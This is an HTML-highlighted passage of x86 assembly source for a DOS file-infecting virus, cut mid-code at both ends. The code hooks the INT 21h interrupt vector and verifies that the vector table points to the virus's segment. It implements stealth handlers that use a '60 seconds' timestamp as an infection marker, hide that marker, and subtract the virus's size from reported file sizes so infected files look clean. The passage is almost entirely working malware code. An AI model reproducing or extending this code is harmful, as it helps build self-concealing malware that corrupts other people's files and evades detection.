        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0050h</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">36h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if segment on TVI is the same</span><span class="sc0">
                    </span><span class="sc1">; than the virus' segment</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinalOV02</span><span class="sc0">   </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Recover registers</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Return original int</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">                      </span><span class="sc1">; 21h and return</span><span class="sc0">
 </span><span class="sc5">@@FinalOV02</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Recover registers and jump to inte-</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">            </span><span class="sc1">; rrupt</span><span class="sc0">
 </span><span class="sc5">@@FinalOV01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">

</span><span class="sc1">;;;;; WHEN YOU WANT TO SET AN INTERRUPT VECTOR</span><span class="sc0">

</span><span class="sc5">@@FijarVector</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">       </span><span class="sc1">; Int 21h?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinalOV01</span><span class="sc0">     </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">             </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; ES=0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0050h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">        </span><span class="sc1">; Compare if segment in TVI is the same</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">36h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; than the virus' segment</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinalOV02</span><span class="sc0">     </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">           </span><span class="sc1">; Put on AntInt21h the new interrupt</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0"> </span><span class="sc1">; vector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">        </span><span class="sc1">; Recover registers and return</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">Basura11</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;;;;;; STEALTH FOR FUNCTION 57h</span><span class="sc0">

</span><span class="sc5">@@HoraFechaHandle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0004</span><span class="sc0">    </span><span class="sc1">; System handle?</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">   </span><span class="sc1">; Then exit</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">           </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetSFT</span><span class="sc0">      </span><span class="sc1">; Get SFT of the handle</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@FinY00</span><span class="sc0">      </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get seconds</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">     </span><span class="sc1">; If they aren't "60", then finish</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@FinY00</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc1">; Check if "set" function</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@HoraFechaHandle2</span><span class="sc0"> </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">    </span><span class="sc5">@@FinY00</span><span class="sc0">      </span><span class="sc1">; Exit if AL&gt;1</span><span class="sc0">
</span><span class="sc1">;; Here to get real seconds in file</span><span class="sc0">
</span><span class="sc5">@@HoraFechaHandle1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Save handle file pointer</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CambiaAtributos</span><span class="sc0"> </span><span class="sc1">; Change attributes and access mode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get file size in AX-DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">01</span><span class="sc0">     </span><span class="sc1">; Subtract 1 from size</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Put this value like new file pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001</span><span class="sc0">    </span><span class="sc1">; Read one byte</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@FinY01</span><span class="sc0">      </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get date/time from SFT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get seconds</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">  </span><span class="sc1">; Save date/time</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RestauraAtributos</span><span class="sc0">   </span><span class="sc1">; Restore attributes</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Restore file pointer</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; Restore registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Hora</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Put date and time on DX and</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Fecha</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; CX respectively</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">                 </span><span class="sc1">; Interrupt return</span><span class="sc0">
</span><span class="sc1">;; Here to set seconds to file</span><span class="sc0">
</span><span class="sc5">@@HoraFechaHandle2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0"> </span><span class="sc1">; Put here the new seconds</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">           </span><span class="sc1">; Eliminate seconds</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">            </span><span class="sc1">; Set seconds to 60</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">        </span><span class="sc1">; Put them directly in the SFT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">        </span><span class="sc1">; fields</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Save file pointer</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CambiaAtributos</span><span class="sc0">    </span><span class="sc1">; Change attributes and access mode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get file size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">01</span><span class="sc0">        </span><span class="sc1">; Subtract 1 from file size</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Put this new file pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">        </span><span class="sc1">; Write the new seconds to the end</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; of the infected file</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RestauraAtributos</span><span class="sc0">  </span><span class="sc1">; Restore attributes and access mode</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Restore file pointer</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">         </span><span class="sc1">; Recover registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">               </span><span class="sc1">; Interrupt return</span><span class="sc0">
    </span><span class="sc5">@@FinY01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RestauraAtributos</span><span class="sc0">  </span><span class="sc1">; Restore attributes</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Restore file pointer</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">@@FinY00</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">         </span><span class="sc1">; Restore registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">      </span><span class="sc1">; Jump to original int 21h</span><span class="sc0">

</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura12</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;; WRITE STEALTH</span><span class="sc0">
</span><span class="sc1">;;; Normally, if you open a handle of a file that can be written, teorically</span><span class="sc0">
</span><span class="sc1">;; it would be disinfected too, but the computer world is very strange :) ,</span><span class="sc0">
</span><span class="sc1">;; so we will do it, just in case.</span><span class="sc0">

</span><span class="sc1">;; DISABLED UNTIL I FIND THE F*%&amp;#! BUG</span><span class="sc0">

</span><span class="sc1">;@@EscribeHandle:           ; All put off, it won't be assembled</span><span class="sc0">
</span><span class="sc1">;        CMP     BX, 0004</span><span class="sc0">
</span><span class="sc1">;        JBE   @@FinInt21h</span><span class="sc0">
</span><span class="sc1">;        PUSHA</span><span class="sc0">
</span><span class="sc1">;        PUSH    DS</span><span class="sc0">
</span><span class="sc1">;        PUSH    ES</span><span class="sc0">
</span><span class="sc1">;        CALL    FakeHandle</span><span class="sc0">
</span><span class="sc1">;        CALL    GetSFT</span><span class="sc0">
</span><span class="sc1">;        JC    @@FinalEscrHandle</span><span class="sc0">
</span><span class="sc1">;        MOV     AL, ES:[DI+02]</span><span class="sc0">
</span><span class="sc1">;        AND     AL, 03h</span><span class="sc0">
</span><span class="sc1">;        CMP     AL, 01</span><span class="sc0">
</span><span class="sc1">;        JB    @@FinW00</span><span class="sc0">
</span><span class="sc1">;        PUSH    WORD PTR ES:[DI+15h]</span><span class="sc0">
</span><span class="sc1">;        PUSH    WORD PTR ES:[DI+17h]</span><span class="sc0">
</span><span class="sc1">;        CALL    ParcheaInt24h</span><span class="sc0">
</span><span class="sc1">;        MOV     BP, 4000h</span><span class="sc0">
</span><span class="sc1">;        JMP   @@KKVH</span><span class="sc0">
</span><span class="sc1">;@@FinalEscrHandle:</span><span class="sc0">
</span><span class="sc1">;        CALL    ParcheaInt24h</span><span class="sc0">
</span><span class="sc1">;  @@FinW00:     CALL    UnfakeHandle</span><span class="sc0">
</span><span class="sc1">;        POP     ES</span><span class="sc0">
</span><span class="sc1">;        POP     DS</span><span class="sc0">
</span><span class="sc1">;        POPA</span><span class="sc0">
</span><span class="sc1">;        JMP   @@FinInt21h</span><span class="sc0">

</span><span class="sc1">;;;;; READ STEALTH</span><span class="sc0">

</span><span class="sc5">@@LeeHandle</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0004</span><span class="sc0">    </span><span class="sc1">; System handle?</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">   </span><span class="sc1">; Then exit</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">           </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetSFT</span><span class="sc0">      </span><span class="sc1">; Get SFT of this handle in ES:DI</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Salida</span><span class="sc0">      </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get seconds on AL</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">     </span><span class="sc1">; Seconds=60?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salida</span><span class="sc0">      </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TamanyoReal</span><span class="sc0"> </span><span class="sc1">; Get size of the virus in the file</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Subtract virus size to file</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0"> </span><span class="sc1">; size</span><span class="sc0">
        </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Save current pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">            </span><span class="sc1">; Recover registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">           </span><span class="sc1">; Execute read function</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
